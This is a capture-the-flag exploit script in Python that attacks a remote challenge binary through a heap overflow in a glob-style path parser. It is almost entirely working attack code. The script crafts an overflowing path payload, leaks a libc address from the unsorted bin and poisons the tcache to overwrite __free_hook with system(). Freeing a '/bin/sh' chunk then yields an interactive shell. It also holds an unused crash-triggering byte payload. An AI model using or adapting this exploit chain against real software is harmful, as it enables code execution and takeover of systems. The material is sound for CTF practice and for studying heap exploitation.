# -*- coding: utf-8 -*-

#########################################################################
# File Name: exp.py
# Created on : 2021-08-14 06:32:12
# Author: r1mit
# Last Modified: 2021-08-21 05:46:59
# Description:
#########################################################################
from pwn_debug import *

## step 1
pdbg=pwn_debug("./chall")

pdbg.context.terminal=['tmux', 'splitw', '-h']
#  pdbg.context.log_level = "DEBUG"
## step 2
pdbg.local("")
#  pdbg.debug("2.23")
pdbg.remote('pwn.challenge.bi0s.in', 1299)
## step 3
p=pdbg.run("local")
#  p=pdbg.run("debug")
#  p=pdbg.run("remote")

#  pdbg.bp([0x1d3b])

elf=pdbg.elf

libc=pdbg.libc

def add(idx, size, path):
    p.recvuntil("Choice >> ")
    p.sendline("1")
    p.recvuntil("idx >> ")
    p.sendline(str(idx))
    p.recvuntil("size >> ")
    p.sendline(str(size))
    p.recvuntil("path >> ")
    p.send(path)

def check(idx):
    p.recvuntil("Choice >> ")
    p.sendline("2")
    p.recvuntil("idx >> ")
    p.sendline(str(idx))

def view(idx):
    p.recvuntil("Choice >> ")
    p.sendline("3")
    p.recvuntil("idx >> ")
    p.sendline(str(idx))

def remove(idx):
    p.recvuntil("Choice >> ")
    p.sendline("4")
    p.recvuntil("idx >> ")
    p.sendline(str(idx))

def exploit():
    poc_data = [ 0x7e, 0xff, 0xff, 0xf1, 0xff,
            0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xf7, 0x78, 0x63,
            0x6f, 0x6e, 0x66, 0x69, 0x67, 0x3d, 0x78, 0xff, 0xff, 0x6c, 0x69, 0x73,
            0x6d, 0x60, 0x69, 0x6e, 0x72, 0x3b, 0x6f, 0x78, 0x73, 0x65, 0x4c, 0x69,
            0x6e, 0x75, 0x78, 0x66, 0x73, 0x79, 0x33, 0x73, 0x73, 0x77, 0x6f, 0x72,
            0x64, 0x53, 0x53, 0x53, 0x25, 0x53, 0x5c, 0x6f, 0x75, 0x74, 0x70, 0x75,
            0x74, 0x2d, 0x66, 0x53, 0x53, 0x3d, 0x78, 0xff, 0xff, 0x6c, 0x69, 0x73,
            0x6d, 0x60, 0x69, 0x6e, 0x72, 0x3b, 0x6f, 0x78, 0x73, 0x65, 0x4c, 0x69,
            0x6e, 0x75, 0x78, 0x66, 0x73, 0x79, 0x33, 0x73, 0x73, 0x77, 0x6f, 0x72,
            0x64, 0x53, 0x53, 0x51, 0x53, 0x53, 0x53, 0x53, 0x53, 0x25, 0x53, 0x5c,
            0x53, 0x53, 0x53, 0x53, 0x53, 0x53, 0x53, 0x53, 0x53, 0x53, 0x53, 0x78,
            0x79, 0x3d, 0x79, 0x3a, 0x6e, 0x2f, 0x2f, 0x2f, 0x2f, 0x2f, 0x2f, 0x2f,
            0x2f, 0x2f, 0x2f, 0x2f, 0x2f, 0x2f, 0x2f, 0x2f, 0x2f, 0x2f, 0x2f, 0x2f,
            0x2f, 0x2f, 0x2f, 0x2f, 0x2f, 0x53, 0x5c, 0x53, 0x53, 0x53, 0x53, 0x53,
            0x53, 0x53, 0x53, 0x53, 0x53, 0x53, 0x2f, 0x78, 0x53, 0x53, 0x53, 0x53,
            0x53, 0x53, 0x53, 0x25, 0x53, 0x5c, 0x53, 0x53, 0x53, 0x53, 0x53, 0x53,
            0x53, 0x53, 0x53, 0x53, 0x53, 0x2f, 0x2f, 0x2f, 0x2f, 0x2f, 0x2f, 0x2f,
            0x6f, 0x79, 0x3d, 0x79, 0x3a, 0x6e, 0x6f, 0x2d, 0x70, 0x72, 0x6f, 0x78,
            0x53, 0x53, 0x53, 0x53, 0x53, 0x53, 0x53, 0x25, 0x53, 0x5c, 0x53, 0x53,
            0x53, 0x53, 0x53, 0x53, 0x53, 0x53, 0x53, 0x53, 0x53, 0x78, 0x79, 0x79,
            0x3a, 0x6e, 0x6f, 0x2d, 0x70, 0x72, 0x6f, 0x78, 0x53, 0x53, 0x53, 0x53,
            0x53, 0x53, 0x53, 0x25, 0x53, 0x5c, 0x53, 0x53, 0x53, 0x53, 0x53, 0x53,
            0x53, 0x53, 0x53, 0x53, 0x53, 0x78, 0x79, 0x3d, 0x79, 0x78, 0x79, 0x3d,
            0x79, 0x3a, 0x6e, 0x2f, 0x2f, 0x2f, 0x2f, 0x2f, 0x2f, 0x2f, 0x2f, 0x2f,
            0x2f, 0x2f, 0x2f, 0x2f, 0x2f, 0x2f, 0x53, 0x53, 0x6d, 0x53, 0x25, 0x53,
            0x5c, 0x53, 0x53, 0x53, 0x53, 0x53, 0x53, 0x53, 0x53, 0x53, 0x53, 0x53,
            0x2f, 0x2f, 0x2f, 0x2f, 0x2f, 0x2f, 0x2f, 0x6f, 0x79, 0x3d, 0x79, 0x3a,
            0x6e, 0x6f, 0x2d, 0x70, 0x2f, 0x2f, 0x2f, 0x2f, 0x2f, 0x6d, 0x61, 0x69,
            0x6e, 0x72, 0x75, 0x00
            ]
    p.sendline("a")
    poc_str = "".join(chr(i) for i in poc_data)
    #  add(0, len(poc_str), poc_str)
    #  check(0) # poc to trigger crash

    poc_str = "~a\\aa/aaaaaaa\\bcdsfdafdsafasdfasd/aaaa"
    #  pdbg.bp([0x19d7], command=["file chall", "dir src/", "break glob.c:734"])
    payload = "~"
    # user name
    payload += "\\"
    payload += 'a'*0x10
    payload += '/' + 'a'*0x7+ p16(0x551) #end name, this will overflow the heap
    payload +="/aa" #filename
    add(0, 0x1000, (p64(0)+p64(0x21))*(0x1000/16)) #0, big chunk data to deploy the heap layout
    add(1, 0x160, '/bin/sh\x00') #1, heap gap between 0 chunk with top chunk

    remove(0) # free 0 chunk
    
    add(3, 0x18, 'aaa'); #3, 0x18 chunk data, which will be occupied by glob function data
    add(4, 0x60, 'a'*8) #4, victim heap chunk
    add(5, 0x60, payload)
    add(0, 0x70, 'a')
    remove(3) # free 0x18 chunk heap
    check(5) # check 5 will malloc 0x18 chunk data out, and heap overflow to the size of 4(victim ) heap to 0x550

    #  pdbg.bp([0x19d7, 0x1977, 0x17c5, 0x181b])#, command=["file chall", "dir src/", "break glob.c:734"])
    remove(4) # free 4 chunk with size 0x550 to unsorted bin
    add(7, 0x60, '/bin/sh\x00') # malloc out 4 out, the remainer will be put back to unsroted bin again
    view(5) # so the 5th heap is in unsorted bin, and we can get main_arena address
    p.recvuntil("Path : ")
    leak_libc = u64(p.recv(8))
    libc_base = leak_libc -  0x1ebbe0
    print("[+] leak libc: "+hex(leak_libc))
    free_hook = libc_base + libc.symbols['__free_hook']
    system_addr = libc_base + libc.symbols['system']

    
    #  pdbg.bp([0x19d7, 0x1977, 0x17c5, 0x181b])#, command=["file chall", "dir src/", "break glob.c:734"])
    remove(0) # free 0x70 to tcache
    add(8, 0x320, 'a'*0x60+p64(0)+p64(0x101)+p64(free_hook)+'\x00'*0x200) #8 overwrite 0x70 tcache bin's fd to free_hook
    
    # normal way to get shll
    add(0, 0x70, 'a')
    add(9, 0x70, p64(system_addr))
    remove(7)
    p.interactive()


if __name__ == "__main__":
    exploit()
